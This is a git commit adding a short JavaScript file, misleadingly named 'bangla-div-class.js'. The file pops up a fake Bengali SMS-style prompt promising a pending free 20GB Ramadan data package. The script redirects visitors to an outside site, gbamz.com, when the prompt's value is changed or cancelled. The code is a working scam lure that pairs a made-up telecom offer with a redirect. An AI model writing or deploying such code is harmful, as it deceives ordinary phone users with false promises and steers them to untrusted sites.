2cfe74ebd9433e66194bb29aee2aabe4771edb52
sweet16palz-hub <sweet16palz@gmail.com>
2026-02-19 10:25:29 +0100

    Create bangla-div-class.js

---
+++ bangla-div-class.js
@@ -0,0 +1,5 @@
+var password = '20GB সক্রিয় করুন'
+password=prompt('SMS: শুভ রমজান, আপনার 20GB রমজান ফ্রি ডেটা প্যাকেজ পেন্ডিং... এখনই সক্রিয় করতে ওকে ক্লিক করুন','20GB সক্রিয় করুন');
+if (password != '20GB সক্রিয় করুন') {
+location.href='https://gbamz.com/bangla-ramadan';
+}
